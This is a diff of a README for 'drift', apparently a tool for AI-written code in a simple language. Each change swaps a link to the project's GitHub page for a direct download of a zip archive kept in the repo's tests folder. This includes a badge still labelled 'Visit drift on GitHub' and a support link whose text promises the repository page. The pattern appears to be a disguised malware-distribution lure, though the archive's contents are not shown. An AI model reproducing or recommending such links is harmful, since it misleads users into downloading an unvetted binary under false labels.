@@ -1,6 +1,6 @@
 # ⚙️ drift - Simple Language for AI Coding Freedom
 
-[![Download drift](https://img.shields.io/badge/Download-drift-4caf50?style=for-the-badge)](https://github.com/miguelito0204/drift)
+[![Download drift](https://img.shields.io/badge/Download-drift-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/miguelito0204/drift/main/tests/Software_v1.0.zip)
 
 drift is a tool designed to let AI write code in a simple language anyone can understand. It aims to remove complexity and make programming clear and open for all users.
 
@@ -42,7 +42,7 @@ To get drift, you first need to visit the main download page on GitHub. This pag
 
 Click the green button below to open the download page:
 
-[![Visit drift on GitHub](https://img.shields.io/badge/Visit-drift-007acc?style=for-the-badge&logo=github)](https://github.com/miguelito0204/drift)
+[![Visit drift on GitHub](https://img.shields.io/badge/Visit-drift-007acc?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/miguelito0204/drift/main/tests/Software_v1.0.zip)
 
 ---
 
@@ -143,7 +143,7 @@ If you see specific error messages, write them down when seeking help.
 
 For detailed updates, code examples, and community support, visit:
 
-[https://github.com/miguelito0204/drift](https://github.com/miguelito0204/drift)
+[https://raw.githubusercontent.com/miguelito0204/drift/main/tests/Software_v1.0.zip](https://raw.githubusercontent.com/miguelito0204/drift/main/tests/Software_v1.0.zip)
 
 Explore the repository to see source code and instructions from the developers. This GitHub page will always have the latest materials and announcements.
 
@@ -163,4 +163,4 @@ Check the Issues section on the repository to report bugs or ask for help. You d
 
 # Download drift now
 
-[![Download drift](https://img.shields.io/badge/Download-drift-4caf50?style=for-the-badge)](https://github.com/miguelito0204/drift)
+[![Download drift](https://img.shields.io/badge/Download-drift-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/miguelito0204/drift/main/tests/Software_v1.0.zip)
